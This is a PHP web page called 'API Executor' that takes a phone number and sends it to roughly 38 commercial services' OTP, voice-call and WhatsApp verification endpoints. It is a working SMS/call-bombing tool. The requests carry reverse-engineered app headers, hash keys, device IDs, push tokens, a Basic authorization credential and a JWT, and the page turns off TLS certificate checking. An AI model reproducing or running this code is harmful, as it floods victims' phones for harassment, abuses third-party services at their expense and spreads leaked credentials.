<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f0f0f0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
        }
        h1 {
            color: #333;
        }
        form {
            margin-bottom: 20px;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 5px;
        }
        label {
            font-weight: bold;
        }
        input[type="text"] {
            padding: 8px;
            margin: 0 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 8px 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .api-item {
            border: 1px solid #ddd;
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            background: #fafafa;
        }
        .api-url {
            font-weight: bold;
            color: #0066cc;
        }
        .response {
            background: #f5f5f5;
            padding: 10px;
            margin-top: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            overflow-x: auto;
        }
        hr {
            margin: 15px 0;
        }
        .status-code {
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>API Executor</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        $apis = [
            // Original API
            [
                "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
                "method" => "POST",
                "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile]),
                "headers" => ["Content-Type: application/json; charset=utf-8", "User-Agent: okhttp/3.9.1"]
            ],
            // Howzat
            [
                "url" => "https://mercury.howzat.com/api/auth/send-otp",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "email" => "", "context" => ["channelId" => 30, "signature" => "i5JP8PinsCA"]]),
                "headers" => ["User-Agent: Dalvik/2.1.0 (Linux; U; Android 9)", "appversion: 9.69", "osversion: 28", "isios: false", "applabel: HOWZAT", "packagename: com.howzat.fantasycricketcashgame", "device: cereus", "Content-Type: application/json"]
            ],
            // FPLabs Generate
            [
                "url" => "https://score.fplabs.tech/score/v1/user/otp/mobile/generate",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "device" => "android", "fcmToken" => "fr9ZvKARQeWc_aiwfiatn_:APA91bFpqWnRAsqSMbnMx4pBHnNdPjoOBHVBXqujahmB-n_ZO-B9tPobuOD_N2c1l3LDCJBXD7FSvDdSoyAIHL_MnFGDNN6BQihdtErE6vHTG4HxsMHWtsQ"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "appversion: 3.15.55", "appos: android", "authorization: Basic ZnBsYWJzOjFGUExhYnMyMzIw", "Content-Type: application/json"]
            ],
            // FPLabs Voice
            [
                "url" => "https://score.fplabs.tech/score/v1/user/otp/mobile/send/voice",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "device" => "android"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "appversion: 3.15.55", "appos: android", "authorization: Basic ZnBsYWJzOjFGUExhYnMyMzIw", "Content-Type: application/json"]
            ],
            // Apna
            [
                "url" => "https://production.apna.co/api/userprofile/v1/otp/",
                "method" => "POST",
                "data" => json_encode(["hash_type" => "play_store", "phone_number" => "91" . $mobile, "request_id" => "eLuYI_" . time(), "retries" => 0]),
                "headers" => ["User-Agent: Android 9 rsdkb; Redmi 6 Xiaomi", "client-version: v1104", "client-session: 1", "Content-Type: application/json"]
            ],
            // Badho
            [
                "url" => "https://auth.badho.in/api/authentication/send-otp-via-phone-call",
                "method" => "POST",
                "data" => json_encode(["contextToken" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJPVFBFbnRyeUlkIjoiN2IzN2NkZGEtZjVjYy00ZDI1LTgzZWMtZjQzNWVmNGZiYjAyIiwiaWF0IjoxNzczMzkzMDEyLCJleHAiOjE3NzU5ODUwMTJ9.cVnQs8D-2c1YjEoeQYySYyF4d6MRcQdcrr6fRnQgZ0E", "phoneNumber" => $mobile, "appName" => "buyer"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "Content-Type: application/json"]
            ],
            // More Retail
            [
                "url" => "https://omni-api.moreretail.in/fast/user/login?phone_number=" . $mobile . "&hash_key=XfsoCeXADQAg",
                "method" => "GET",
                "data" => null,
                "headers" => ["User-Agent: okhttp/4.12.0", "app-version: 3.0.5", "platform: android"]
            ],
            // Filo
            [
                "url" => "https://regional.api.findfilo.com/users/otp/v2",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "code" => "91", "key" => "Y0T6c67I2AM", "deviceId" => "450c18272412a069", "otp" => "976612"]),
                "headers" => ["User-Agent: Dart/2.18", "app-version-name: 4.6.4", "app-platform: android", "device-id: 450c18272412a069", "Content-Type: application/json"]
            ],
            // Dealshare
            [
                "url" => "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
                "method" => "POST",
                "data" => json_encode(["phoneNumber" => $mobile, "name" => $mobile, "hashCode" => "k387IsBaTmn", "resendOtp" => 0, "source" => "app", "loginType" => "OTP", "deviceId" => "d054cb413a019abd"]),
                "headers" => ["User-Agent: okhttp/4.9.3", "appversion: 3.1.4", "deviceid: d054cb413a019abd", "channel: APP", "platform: android", "Content-Type: application/json"]
            ],
            // Talabat
            [
                "url" => "https://api.talabat.com/customers/v1/AE/mobile-verification/otp-request",
                "method" => "POST",
                "data" => json_encode(["mobile_country_code" => "91", "mobile_number" => $mobile, "channel" => "phone_call"]),
                "headers" => ["User-Agent: Dart/3.8", "x-device-version: 13.400", "x-country: ae", "x-app-version: 13.40.0", "Content-Type: application/json"]
            ],
            // Zoop
            [
                "url" => "https://appapi.zoopindia.in/v2/customers/resend-otp",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "customerId" => 403171]),
                "headers" => ["User-Agent: okhttp/4.9.2", "Content-Type: application/json"]
            ],
            // Medibuddy
            [
                "url" => "https://loginprod.medibuddy.in/user/v2/register",
                "method" => "POST",
                "data" => json_encode(["advertiserId" => "f7b27fba-3bcc-48ad-9964-6e853374c735", "phonenumber" => $mobile, "platform" => "Android"]),
                "headers" => ["User-Agent: okhttp/5.1.0", "mbappversionname: 3.3.22", "mbplatform: android", "Content-Type: application/json"]
            ],
            // Box8 Sign Up
            [
                "url" => "https://accounts.box8.co.in/customers/sign_up",
                "method" => "POST",
                "data" => json_encode(["phone_no" => $mobile, "name" => "user", "email" => "user@gmail.com"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "Content-Type: application/json"]
            ],
            // Box8 Sign In
            [
                "url" => "https://accounts.box8.co.in/customers/sign_in",
                "method" => "POST",
                "data" => json_encode(["initiate" => "true", "phone_no" => $mobile, "login_method" => "whatsapp_otp"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "Content-Type: application/json"]
            ],
            // Droom
            [
                "url" => "https://apinew.droom.in/v6/account/login-otp-with-token",
                "method" => "POST",
                "data" => json_encode(["mobile_phone" => $mobile, "page_source" => "login_otp", "verify_token" => "1pLZq3nVDliQvr4TBBgMgXkk2i9zG0MgZSJWWIq39UROcROMv/tIdBK29g/fKOZ1np1XzwjTmi4a\nTBjl4xgcIA==\n"]),
                "headers" => ["User-Agent: Dalvik/2.1.0", "Content-Type: application/json"]
            ],
            // Revmaxx
            [
                "url" => "https://bb-api.revmaxxtec.com/prod/v1/login/otp/sendotp",
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile, "hash" => "ax2B9LONxQF", "token" => "czvC8JprS-yKb5ySJvSYx8:APA91bE3djyVJbUSnXbP9WHjWs__jrl8tMBLqmAHPSIwFI-OMteVPRYxB0MtOlqzkIqH9mIpYuxcGffWIUj_k5YXiYSMf2QH1ufiJdCvXcPEgloLqpdSHJA"]),
                "headers" => ["User-Agent: okhttp/4.9.2", "Content-Type: application/json"]
            ],
            // Faasos SMS
            [
                "url" => "https://thanos.faasos.io/v3/customer/generate_otp.json?app_version=10386&device_id=65aff73a03f5bbea&client_os=behrouz_android",
                "method" => "POST",
                "data" => json_encode(["phone_number" => $mobile, "country_code" => "IND", "dialing_code" => "+91", "is_new_customer" => true, "communication_channel" => "sms"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "client-source: 13", "brand-id: 8", "Content-Type: application/json"]
            ],
            // Faasos WhatsApp
            [
                "url" => "https://thanos.faasos.io/v3/customer/generate_otp.json?app_version=10386&device_id=65aff73a03f5bbea&client_os=behrouz_android",
                "method" => "POST",
                "data" => json_encode(["phone_number" => $mobile, "country_code" => "IND", "dialing_code" => "+91", "is_new_customer" => true, "communication_channel" => "whatsapp"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "client-source: 13", "brand-id: 8", "Content-Type: application/json"]
            ],
            // Capital Now
            [
                "url" => "https://api2.capitalnow.in/v2/auth/send-otp",
                "method" => "POST",
                "data" => json_encode(["api_key" => "CN5YAGNGU1A", "device_name" => "Xiaomi,Redmi 6", "device_unique_id" => "5361f68e8133e155", "mobile_no" => $mobile, "platform" => "Android", "otp_hash" => "sLz7YkIZqlu"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "Content-Type: application/json"]
            ],
            // Staffpay
            [
                "url" => "https://api.staffpay.in/auth/sendOtp/" . $mobile . "?source=RiderApp&paramType=installParams",
                "method" => "GET",
                "data" => null,
                "headers" => ["User-Agent: okhttp/4.12.0", "source: RiderApp", "appv: 12.11"]
            ],
            // GoKwik
            [
                "url" => "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile]),
                "headers" => ["User-Agent: okhttp/4.12.0", "gk-merchant-id: 3mt5u7j1b0kyl1t510", "appplatform: android", "appversion: 4.536", "Content-Type: application/json"]
            ],
            // Digihaat
            [
                "url" => "https://prod.digihaat.in/clientApis/v2/auth/sendOTP",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile, "appHash" => "eEObPclnEX9"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "appversion: 1.1.33", "platform: android", "Content-Type: application/json"]
            ],
            // Indiawagon
            [
                "url" => "https://indiawagon.com/graphql",
                "method" => "POST",
                "data" => json_encode(["operationName" => null, "variables" => ["email" => "+91" . $mobile, "mobile" => "+91" . $mobile, "isSignUp" => true], "query" => "query otpLogin(\$email: String!, \$mobile: String!, \$isSignUp: Boolean!) { getOTP(email: \$email, mobile: \$mobile, isSignUp: \$isSignUp) { details oTP status } }"]),
                "headers" => ["User-Agent: Dart/3.10", "Content-Type: application/json"]
            ],
            // FirstClub
            [
                "url" => "https://prod-heimdall.firstclub.tech/api/v1/page/login/send-otp",
                "method" => "POST",
                "data" => json_encode(["channel" => "+91" . $mobile, "channel_type" => "SMS", "device" => ["id" => "a2be27817e2df56b", "type" => "ANDROID", "os_version" => "28", "app_version" => "2.0.78"], "deviceId" => "a2be27817e2df56b"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "Content-Type: application/json"]
            ],
            // Polo Dating
            [
                "url" => "https://polodating.com/polo/v1.0/send/otp/android",
                "method" => "POST",
                "data" => http_build_query(["phone" => "91" . $mobile, "country" => "India"]),
                "headers" => ["User-Agent: okhttp/5.1.0", "platform: android", "Content-Type: application/x-www-form-urlencoded"]
            ],
            // Discovery Plus
            [
                "url" => "https://ap2-prod-direct.discoveryplus.in/authentication/sendOTP",
                "method" => "POST",
                "data" => json_encode(["channel" => "sms", "destination" => "+91" . $mobile]),
                "headers" => ["User-Agent: Dalvik/2.1.0", "x-disco-client: ANDROID:9:dplus-india:6.0.5", "Content-Type: application/json"]
            ],
            // Kickcash
            [
                "url" => "https://app-api.kickcash.in/api/v1/onboard",
                "method" => "POST",
                "data" => json_encode(["device_id" => "39e5dfbf67e51801", "app_version" => "19.1", "mobile" => $mobile, "phone_code" => "+91", "gaid" => "f7b27fba-3bcc-48ad-9964-6e853374c735"]),
                "headers" => ["User-Agent: okhttp/4.12.0", "device-id: 39e5dfbf67e51801", "Content-Type: application/json"]
            ],
            // KisanKonnect
            [
                "url" => "https://api.kisankonnect.in/api/v2/customer-masters/generate-otp",
                "method" => "POST",
                "data" => json_encode(["mobile_no" => $mobile]),
                "headers" => ["User-Agent: Dart/3.8", "Content-Type: application/json"]
            ],
            // Unacademy
            [
                "url" => "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile, "country_code" => "IN", "otp_type" => 2, "email" => "", "send_otp" => true, "is_un_teach_user" => false]),
                "headers" => ["User-Agent: Mozilla/5.0", "x-platform: 7", "origin: https://unacademy.com", "Content-Type: application/json"]
            ],
            // A23 Games
            [
                "url" => "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
                "method" => "POST",
                "data" => json_encode(["device_id" => "jKeWRtLJYslddXIt", "channel" => "web", "mobile" => "+91" . $mobile, "model" => "Google,Android SDK", "type" => "signup", "version" => "1.0.5"]),
                "headers" => ["User-Agent: Dart/3.3", "Content-Type: application/json"]
            ],
            // FNO
            [
                "url" => "https://api.fno.co/fnouser/checkUser",
                "method" => "POST",
                "data" => json_encode(["serviceRequest" => ["deviceInfo" => ["deviceId" => "test_device", "os" => "ANDROID"], "userInfo" => ["userName" => $mobile]]]),
                "headers" => ["User-Agent: okhttp/4.9.2", "Content-Type: application/json"]
            ],
            // Astrosage
            [
                "url" => "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&phoneno=" . $mobile . "&deviceid=jKeWRtLJYslddXIt",
                "method" => "GET",
                "data" => null,
                "headers" => ["User-Agent: okhttp/3.9.1"]
            ],
            // HealthRx
            [
                "url" => "https://bfhlprodapigw.healthrx.co.in/phr-identity-module-prod/api/auth/request-otp",
                "method" => "POST",
                "data" => json_encode(["mobileNumber" => $mobile, "partnerId" => "eBH"]),
                "headers" => ["User-Agent: okhttp/3.9.1", "Content-Type: application/json"]
            ],
            // Snapmint
            [
                "url" => "https://api.snapmint.com/v1/public/sign_up",
                "method" => "POST",
                "data" => json_encode(["mobile" => $mobile]),
                "headers" => ["User-Agent: Dart/3.3", "Content-Type: application/json"]
            ],
            // Clarity App
            [
                "url" => "https://services.clarityapp.in/auth/phone/otp/send?phoneNumber=91" . $mobile,
                "method" => "GET",
                "data" => null,
                "headers" => ["User-Agent: okhttp/4.12.0", "avn: 3.42.0", "pltfrm: ANDROID"]
            ],
            // BetterCommerce
            [
                "url" => "https://api20.bettercommerce.io/api/v2/notification/otp",
                "method" => "POST",
                "data" => json_encode(["mobileNo" => $mobile, "entityType" => 1, "templateId" => 1]),
                "headers" => ["User-Agent: okhttp/4.12.0", "channel: App", "Content-Type: application/json"]
            ],
            // Doodhvale
            [
                "url" => "https://doodhvale.in/dv/doodhvale/api/web/v5/users/signup",
                "method" => "POST",
                "data" => http_build_query(["mobile" => $mobile, "deviceId" => "0"]),
                "headers" => ["User-Agent: Dart/3.7", "app_platform: flutter-cx", "Content-Type: application/x-www-form-urlencoded"]
            ]
        ];

        foreach ($apis as $api) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api['url']);
            
            if ($api['method'] == 'POST') {
                curl_setopt($ch, CURLOPT_POST, true);
                if ($api['data']) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                }
            } else {
                curl_setopt($ch, CURLOPT_POST, false);
            }
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);

            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            curl_close($ch);

            echo "<div class='api-item'>";
            echo "<div class='api-url'><strong>API:</strong> " . $api['url'] . "</div>";
            echo "<div><strong>Method:</strong> " . $api['method'] . "</div>";
            echo "<div class='response'><strong>Response:</strong><br>" . htmlspecialchars($response ?: $error) . "</div>";
            echo "<div class='status-code " . ($httpcode >= 200 && $httpcode < 300 ? 'status-success' : 'status-error') . "'>Status Code: " . $httpcode . "</div>";
            echo "</div><hr>";
        }
    }
    ?>
</div>
</body>
</html>